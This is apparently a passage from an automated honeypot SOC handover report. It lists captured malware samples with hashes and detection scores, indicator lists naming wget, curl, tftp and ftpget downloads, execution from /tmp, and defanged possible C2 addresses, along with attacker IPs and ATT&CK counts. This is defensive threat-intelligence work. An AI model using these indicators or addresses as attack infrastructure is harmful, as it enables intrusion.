| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3552f719a379865960a169e2dacea968f4e8f46bd31907f2f89df431d09d9d9e` | ELF Binary (Linux executable) (x86-64 64-bit) | `3552f719a3798659...` | 46/100 | 🟡 MEDIUM | **40/74** 🔴 |
| `3625cfdcd6d434bfa672753ef4b197df8a01388d220bafc9edfa2d0d29c7fcef` | ELF Binary (Linux executable) (x86-64 64-bit) | `3625cfdcd6d434bf...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `3625d068896953595e75df328676a08bc071977ac1ff95d44b745bbcb7018c6f` | ELF Binary (Linux executable) (ARM 32-bit) | `3625d06889695359...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `3910f46fe809d723d169b5723e0724dba7aed441a065b53b98e2f1b0a9736569` | ELF Binary (Linux executable) (MIPS 32-bit) | `3910f46fe809d723...` | 65/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` | ELF Binary (Linux executable) (x86 32-bit) | `3ad48bae18b7ea8e...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `40db9279ba409757c074048529be5bf8f141fa022489a965792e7f7de2223b78` | ELF Binary (Linux executable) (ARM 32-bit) | `40db9279ba409757...` | 62/100 | 🟡 MEDIUM | **31/73** 🔴 |
| `44689d3e1a7f460db2ecc14351c171f4910721257f83024c63cbc07f4e2b977c` | ELF Binary (Linux executable) (x86-64 64-bit) | `44689d3e1a7f460d...` | 35/100 | 🟢 LOW | **13/74** 🔴 |
| `4481c88954298a5e5e0f0d70cd011644e8442e1aeb0ce42cc3c8b4d51a637f02` | ELF Binary (Linux executable) (ARM 32-bit) | `4481c88954298a5e...` | 51/100 | 🟡 MEDIUM | **29/73** 🔴 |
| `47b268c21591069bfe4099833ad66b8138a53ab2dcb866e040d466aee1f8624c` | ELF Binary (Linux executable) (x86-64 64-bit) | `47b268c21591069b...` | 42/100 | 🟡 MEDIUM | **31/74** 🔴 |
| `494ab0439cd9a373aca71bf5107e0718a9e14b9b805632835c99c42b88a50984` | ELF Binary (Linux executable) (x86 32-bit) | `494ab0439cd9a373...` | 51/100 | 🟡 MEDIUM | **28/73** 🔴 |
| `526c830542c17e6883da850de8dc2c3c2ffc35b446f33c61892b193e50f8d8ed` | ELF Binary (Linux executable) (x86-64 64-bit) | `526c830542c17e68...` | 53/100 | 🟡 MEDIUM | **33/73** 🔴 |
| `59691617d4c9bfe4a9202c318e632faa7c8a2d5dfdb46297e27c1a33971f3530` | ELF Binary (Linux executable) (unknown (e_machine=0x2a) 32-bit) | `59691617d4c9bfe4...` | 54/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `59c29436755b0778e968d49feeae20ed65f5fa5e35f9f7965b8ed93420db91e5` | ELF Binary (Linux executable) (x86-64 64-bit) | `59c29436755b0778...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `5f160094d291b41abe2e65a17c1b1c8a4aec041bf63c72cf01494b2ff37e20c9` | ELF Binary (Linux executable) (ARM 32-bit) | `5f160094d291b41a...` | 64/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `629db57b96d6e965401d866f895d86c542efe344b3d489630a6ec09d643add76` | ELF Binary (Linux executable) (x86-64 64-bit) | `629db57b96d6e965...` | 44/100 | 🟡 MEDIUM | **36/73** 🔴 |
| `64b8416c418c265ee1a7999470d9f688ad8204c1d85341e270e23649ee21e11b` | Python Script | `64b8416c418c265e...` | 64/100 | 🟡 MEDIUM | **12/74** 🔴 |
| `6aa904125beb01924243b0dd04e0988b16b8bccd5479224f8bbcd762814b303e` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `6aa904125beb0192...` | 61/100 | 🟡 MEDIUM | **27/73** 🔴 |
| `6d38d8be9058928878b583202c87b80fe8ff66b347e0d325a3c2b956094bfe7c` | ELF Binary (Linux executable) (MIPS 32-bit) | `6d38d8be90589288...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` | Bash Script | `725d1de20672ed85...` | 85/100 | 🔴 HIGH | **39/74** 🔴 |
| `75737a0d2987fb60d7a1f17ff2a7122132545e84a327e3a5372be51500a3be12` | ELF Binary (Linux executable) (x86-64 64-bit) | `75737a0d2987fb60...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `765289f938cc2bd64c9778dbabe048afa8ac3277a150c940d2730c14d24687b5` | ELF Binary (Linux executable) (x86-64 64-bit) | `765289f938cc2bd6...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `783adb7ad6b16fe9818f3e6d48b937c3ca1994ef24e50865282eeedeab7e0d59` | Bash Script | `783adb7ad6b16fe9...` | 60/100 | 🟡 MEDIUM | **27/74** 🔴 |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 46/100 | 🟡 MEDIUM | **40/73** 🔴 |
| `7b61a0032297d2b400d3dd5e69556a8ca31adb717464c247aaf997f4b4de26f6` | Unknown binary | `7b61a0032297d2b4...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `80c3fe2ae1062abf56456f52518bd670f9ec3917b7f85e152b347ac6b6faf880` | Unknown binary | `80c3fe2ae1062abf...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `80e404f6a1b7c29380ce6a82ed5379e81b3bd50f9ddfde1ab6a849d30959a3d4` | ELF Binary (Linux executable) (unknown (e_machine=0x14) 32-bit) | `80e404f6a1b7c293...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `84fac1d9c9d83182fa6428365907f7fbeb4c621eb7eb2b2a0140fdcd245b20e9` | ELF Binary (Linux executable) (x86-64 64-bit) | `84fac1d9c9d83182...` | 45/100 | 🟡 MEDIUM | **40/76** 🔴 |
| `85338e737e8b8c9ff9742ebc5bb0b73d91d441774161ad936f14910259d985ba` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `85338e737e8b8c9f...` | 60/100 | 🟡 MEDIUM | **26/73** 🔴 |
| `85a17fe8e290a224a717445d0f5e819283567101a92945ea10069946dc7e19d8` | Shell Script | `85a17fe8e290a224...` | 56/100 | 🟡 MEDIUM | **16/74** 🔴 |
| `88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` | ELF Binary (Linux executable) (x86-64 64-bit) | `88d028a54a136782...` | 87/100 | 🔴 HIGH | **44/74** 🔴 |
| `8e7395ed4110a27c717f63cd7e039b19939c87c9283710108ebc38946f4fbf98` | Shell Script | `8e7395ed4110a27c...` | 62/100 | 🟡 MEDIUM | **6/75** 🔴 |
| `8ee57538c54d91114aaf824330878c6bca5e905f32a7d4ee7517e1efd364e19c` | Unknown binary | `8ee57538c54d9111...` | 56/100 | 🟡 MEDIUM | **40/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`3ad48bae18b7ea8e7ffe3608b6eeaa4673b6ff47e9e6a21def774eecba66364a` (3ad48bae18b7ea8e7ffe3608...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`725d1de20672ed85f32e823fe067ed6eb17149019e146bafbbe59338df78e37f` (725d1de20672ed85f32e823f...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `chmod +x (make executable)` — `chmod +x`
- `IP:Port (possible C2)` — `51.158.248[.]122:8517`

_`88d028a54a136782982817d1d93c89b075b7f04897b0c0681311add7c8712eb6` (88d028a54a136782982817d1...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `65.181.79[.]60` | HK | PCCW IMS Ltd (PCCW Business Internet Access) | **100** ⚠️ | 50 |
| `144.22.238[.]238` | BR | Oracle Corporation | **100** ⚠️ | 3 |
| `218.248.19[.]102` | IN | The Principal | **100** ⚠️ | 50 |
| `93.4.16[.]74` | FR | DSL | **100** ⚠️ | 11 |
| `64.110.90[.]250` | KR | Oracle Corporation | **100** ⚠️ | 4 |
| `203.192.211[.]180` | IN | Indusind Media And Communication Ltd. | **100** ⚠️ | 44 |
| `78.187.230[.]168` | TR | Turk Telekomunikasyon Anonim Sirketi | **100** ⚠️ | 40 |
| `72.167.53[.]56` | US | GoDaddy.com, LLC | **100** ⚠️ | 7 |
| `65.20.233[.]110` | IQ | Earthlink Telecommunications Equipment Trading & Services DMCC | **100** ⚠️ | 50 |
| `176.53.159[.]196` | PL | BearShield Technologies S.R.O. | **100** ⚠️ | 34 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1078](https://attack.mitre.org/techniques/T1078) | 231 |
| [T1592](https://attack.mitre.org/techniques/T1592) | 201 |
| [T1083](https://attack.mitre.org/techniques/T1083) | 73 |
| [T1059.004](https://attack.mitre.org/techniques/T1059/004) | 22 |
| [T1222.002](https://attack.mitre.org/techniques/T1222/002) | 20 |

---

## 🔕 False Positive Summary (33 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| AbuseIPDB score 3 below threshold 25 | 1 |
| AbuseIPDB score 5 below threshold 25 | 2 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 27 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 761 cases |
| Tool 34  | Credential Extractor        | ✅ 286 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 15 fingerprints |
| Tool 36  | Command Clustering          | ✅ 11 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 172 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 33 filtered (4.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 91 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 37 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 230 priority case(s) shown individually · 49 recon entry/entries in table (18 group(s) consolidating 467 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-07-10T17:51:36Z_
